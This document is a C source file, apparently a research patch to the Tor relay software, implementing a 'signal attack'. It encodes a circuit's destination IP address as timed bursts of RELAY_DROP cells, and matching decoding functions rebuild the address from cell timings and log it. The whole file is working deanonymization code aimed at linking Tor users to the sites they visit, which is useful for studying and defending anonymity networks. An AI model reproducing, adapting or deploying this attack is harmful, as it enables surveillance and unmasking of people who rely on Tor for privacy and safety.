

#include "or.h"
#include "relay.h"
#include "orconfig.h"
#include "config.h"
#include "compat.h"
#include <time.h>
#include <unistd.h>
#include <stdio.h>
#define TOR_SIGNAL_ATTACK_PRIVATE
#include "signal_attack.h"


static int signal_send_relay_drop(int nbr, circuit_t *circ) {
  while (nbr > 0) {
    if (relay_send_command_from_edge_(0, circ,
                                RELAY_COMMAND_DROP, NULL, 0,
                                TO_ORIGIN_CIRCUIT(circ)->cpath->prev, __FILE__, __LINE__) < 0) {
      log_debug(LD_BUG, "Signal not completly sent");
      return -1;
    }
    nbr--;
  }

  return 0;
}


// --------------------------_DECODING_ FUNCTIONS----------------------------------

static smartlist_t *circ_timings;

STATIC int signal_compare_signal_decode_(const void **a_, const void **b_) {
  const signal_decode_t *a = *a_;
  const signal_decode_t *b = *b_;
  circid_t circid_a = a->circid;
  circid_t circid_b = b->circid;
  if (circid_a < circid_b)
    return -1;
  else if (circid_a == circid_b)
    return 0;
  else
    return 1;
}

STATIC int signal_compare_key_to_entry_(const void *_key, const void **_member) {
  const circid_t circid = *(circid_t *)_key;
  const signal_decode_t *entry = *_member;
  if (circid < entry->circid)
    return -1;
  else if (circid == entry->circid)
    return 0;
  else
    return 1;
}

STATIC void handle_timing_add(signal_decode_t *circ_timing, struct timespec *now,
    int SignalMethod) {
  switch (SignalMethod) {
    case MIN_BLANK:
      if (smartlist_len(circ_timing->timespec_list) > 255*4) {
        // free the element before the moving operation from del_keeporder
        tor_free(circ_timing->timespec_list->list[0]);
        smartlist_del_keeporder(circ_timing->timespec_list, 0);
        circ_timing->first = *(struct timespec *) smartlist_get(circ_timing->timespec_list, 0);
      }
      smartlist_add(circ_timing->timespec_list, now);
      circ_timing->last = *now;
      break;
    case BANDWIDTH_EFFICIENT:
      if (smartlist_len(circ_timing->timespec_list) > 32*3+1) {
        tor_free(circ_timing->timespec_list->list[0]);
        smartlist_del_keeporder(circ_timing->timespec_list, 0);
        circ_timing->first = *(struct timespec *) smartlist_get(circ_timing->timespec_list, 0);
      }
      smartlist_add(circ_timing->timespec_list, now);
      circ_timing->last = *now;
      break;
    default:
      log_debug(LD_BUG, "handle_timing_add default case reached. It should not happen");
  }
}


STATIC int delta_timing(struct timespec *t1, struct timespec *t2) {
  const or_options_t *options = get_options();
  double elapsed_ms = (t2->tv_sec-t1->tv_sec)*1000.0 +\
                      (t2->tv_nsec-t1->tv_nsec)*1E-6;
  if (elapsed_ms  > SIGNAL_ATTACK_MAX_BLANK)
    return 2;
  else if (elapsed_ms >= options->SignalBlankIntervalMS)
    return 0;
  else if (elapsed_ms > 0)
    return 1;
  else {
    log_debug(LD_BUG, "delta_timing compute a negative delta");
    return -1;
  }
}

/*
 * return 1 if successfully decoded a signal
 *        0 if saw nothing
 *       -1 if an error happened
 */

//Ugh! the code is ugly. needs refactoring.
STATIC int signal_minimize_blank_latency_decode(signal_decode_t *circ_timing) {
  //count starts at 1 to decode 0 as a 1 relay drop.
  int i;
  int count = 1;
  int subips[4];
  int ipcount = 0;
  /*log_info(LD_GENERAL, "timespec_list size %d\n and smartlist_circ size %d",*/
      /*smartlist_len(circ_timing->timespec_list), smartlist_len(circ_timings));*/
  for (i = 1; i < smartlist_len(circ_timing->timespec_list); ++i) {
    switch (delta_timing(smartlist_get(circ_timing->timespec_list, i-1),
          smartlist_get(circ_timing->timespec_list, i))) {
      case 0:
        subips[ipcount] = count;
        count = 1;
        if (ipcount == 3) {
          // we have decoded the signal
          log_info(LD_SIGNAL_ATTACK, "Dest IP : %d.%d.%d.%d",
              subips[0]-1, subips[1]-1, subips[2]-1, subips[3]-1);
          return 1;
        }
        ipcount++;
        /*log_info(LD_GENERAL, "ipcount increased to %d", ipcount);*/
        break;
      case 1:
        count++;
        break;
      case 2:
        // delta timing is above the accepting range, we restart the count to 0
        if (ipcount == 3) {
          // we have decoded the signal
          subips[ipcount] = count;
          log_info(LD_SIGNAL_ATTACK, "Dest IP : %d.%d.%d.%d",
              subips[0]-1, subips[1]-1, subips[2]-1, subips[3]-1);
          return 1;
        }
        count = 1;
        break;
      default:
        return -1;
        break;
    }
  }
  return 0;
}
static int signal_bandwidth_efficient_decode(signal_decode_t *circ_timing) {
  int i, bit;
  int count = 1;
  int nbr_sub_ip_decoded = 0;
  char subips[4][9];
  for (i = 0; i < 4; i++) {
    subips[i][8] = '\0';
  }
  int nth_bit = 0;
  for (i = 1; i < smartlist_len(circ_timing->timespec_list); i++) {
    switch(delta_timing(smartlist_get(circ_timing->timespec_list, i-1),
        smartlist_get(circ_timing->timespec_list, i))) {
      case 0:
        if (count == 2) 
          bit = 0;
        else if (count == 3)
          bit = 1;
        else {
          // we suppose that after having recorded an entire subip, we indeed have a signal
          // Obviously, this should not happen
          if (nbr_sub_ip_decoded > 0) 
            log_info(LD_SIGNAL_ATTACK, "Signal distorded or no signal, count: %d", count);
          count = 1;
          continue;
        }
        if (bit & 1)
          subips[nbr_sub_ip_decoded][nth_bit] = '1';
        else
          subips[nbr_sub_ip_decoded][nth_bit] = '0';
        nth_bit++;
        if (nth_bit > 7) {
          // we have decoded a subip
          /*log_info(LD_SIGNAL_ATTACK, "subip ip found:%s",*/
              /*subips[nbr_sub_ip_decoded]);*/
          if (nbr_sub_ip_decoded == 3) {
            log_info(LD_SIGNAL_ATTACK, "dest IP in binary: %s.%s.%s.%s",
                subips[0], subips[1], subips[2], subips[3]);
            return 1;
          }
          nth_bit = 0;
          nbr_sub_ip_decoded++;
        }
        count = 1;
        break;
      case 1:
        count++;
        break;
      case 2:
        if (nbr_sub_ip_decoded == 3 && nth_bit == 7) {
          if (count == 2)
            bit = 0;
          else if (count == 3)
            bit = 1;
          else {
            log_info(LD_SIGNAL_ATTACK, "signal distorded: %s.%s.%s.%s - count %d",
                subips[0], subips[1], subips[2], subips[3], count);
            /*return 0;*/
            continue;
          }
          if (bit & 1)
            subips[nbr_sub_ip_decoded][nth_bit] = '1';
          else
            subips[nbr_sub_ip_decoded][nth_bit] = '0';
          log_info(LD_SIGNAL_ATTACK, "dest IP in binary: %s.%s.%s.%s\n",
                subips[0], subips[1], subips[2], subips[3]);
          return 1;
        }

        break;
      default:
        return -1;
        break;
    }
  }
  return 0;
}


/*
 * Mapping o of circ->circ_id to signal_decode_t struct
 */



STATIC int signal_listen_and_decode(circuit_t *circ) {
  
  if (!circ_timings)
    circ_timings = smartlist_new();
  const or_options_t *options = get_options();
  // add to the smartilist the current time
  //todo
  signal_decode_t *circ_timing;
  struct timespec *now = tor_malloc_zero(sizeof(struct timespec));
  circid_t circid = circ->n_circ_id;
  circ_timing = smartlist_bsearch(circ_timings, &circid, 
      signal_compare_key_to_entry_);
  clock_gettime(CLOCK_REALTIME, now);
  if (!circ_timing) {
    circ_timing = tor_malloc_zero(sizeof(signal_decode_t));
    circ_timing->circid = circid;
    circ_timing->timespec_list = smartlist_new();
    circ_timing->first = *now;
    smartlist_insert_keeporder(circ_timings, circ_timing,
        signal_compare_signal_decode_);
  }
  circ_timing->last = *now;
  handle_timing_add(circ_timing, now, options->SignalMethod);
  switch (options->SignalMethod) {
    case BANDWIDTH_EFFICIENT: return signal_bandwidth_efficient_decode(circ_timing);
            break;
    case MIN_BLANK: return signal_minimize_blank_latency_decode(circ_timing);
            break;
    default:
      log_debug(LD_BUG, "signal_listen_and_decode switch: no correct case\n");
      return -1;
  }
  return -1;
}

//--------------------------END _DECODING_ FUNCTION-------------------------------

//-------------------------- _ENCODING_ FUNCTION ---------------------------------
static void address_to_subip(char *address, int *subip) {
  
  char *tmp_subaddress;
  tmp_subaddress = strtok(address, ".");
  int i = 0;
  subip[i++] = atoi(tmp_subaddress);
  while (tmp_subaddress != NULL) {
    tmp_subaddress = strtok(NULL, ".");
    if (tmp_subaddress != NULL) {
      subip[i++] = atoi(tmp_subaddress);
    }
  }
}

STATIC void subip_to_subip_bin(uint8_t subip, char *subip_bin) {
  int k;
  for (int i=7; i>=0; i--) {
    k = subip >> i;
    if (k & 1)
      subip_bin[i] = '1';
    else
      subip_bin[i] = '0';
  }
}

STATIC int signal_bandwidth_efficient(char *address, circuit_t *circ) {
  struct timespec time, rem;
  const or_options_t *options = get_options();
  time.tv_sec = 0;
  time.tv_nsec = options->SignalBlankIntervalMS*1E6;
  int subip[4];
  address_to_subip(address, subip);
  char subip_bin[8];
  for (int i = 0; i < 4; i++) {
    subip_to_subip_bin((uint8_t)subip[i], subip_bin);
    for (int j = 7; j > -1; j--) {
      if (subip_bin[j] == '0') {
        if (signal_send_relay_drop(2, circ) < 0) {
          log_info(LD_SIGNAL_ATTACK, "BUG: signal_send_relay_drop returned -1\n");
          return -1;
        }
      }
      else if (subip_bin[j] == '1') {
        if (signal_send_relay_drop(3, circ) < 0) {
          log_info(LD_SIGNAL_ATTACK, "BUG: signal_send_relay_drop returned -1\n");
          return -1;
        }
      }
      else {
        log_info(LD_SIGNAL_ATTACK, "BUG: something went wrong with subip_bin: %s", subip_bin);
      }
      if (nanosleep(&time, &rem) < 0) {
        log_info(LD_SIGNAL_ATTACK, "BUG: nanosleep call failed\n");
        return -1;
      }
    }
  }
  return 0;
}

STATIC int signal_minimize_blank_latency(char *address, circuit_t *circ) {
  struct timespec time, rem;
  const or_options_t *options = get_options();
  time.tv_sec = 0;
  time.tv_nsec = options->SignalBlankIntervalMS*1E6;
  int i;
  int subip[4];
  address_to_subip(address, subip);
  for (i = 0; i < 4; i++) {
    if (signal_send_relay_drop(subip[i]+1, circ) < 0) { //offset 1 for encoding 0.
      return -1;
    }
    /*sleep(1); //sleep 1second*/
    if (nanosleep(&time, &rem) < 0) {
      log_info(LD_SIGNAL_ATTACK, "BUG: nanosleep call failed\n");
      return -1;
    }
  }
  return 0;
}
void signal_encode_destination(char *address, circuit_t *circ) {
  const or_options_t *options = get_options();
  switch (options->SignalMethod) {
    case BANDWIDTH_EFFICIENT: signal_bandwidth_efficient(address, circ);
            break;
    case MIN_BLANK: signal_minimize_blank_latency(address, circ);
  }
}


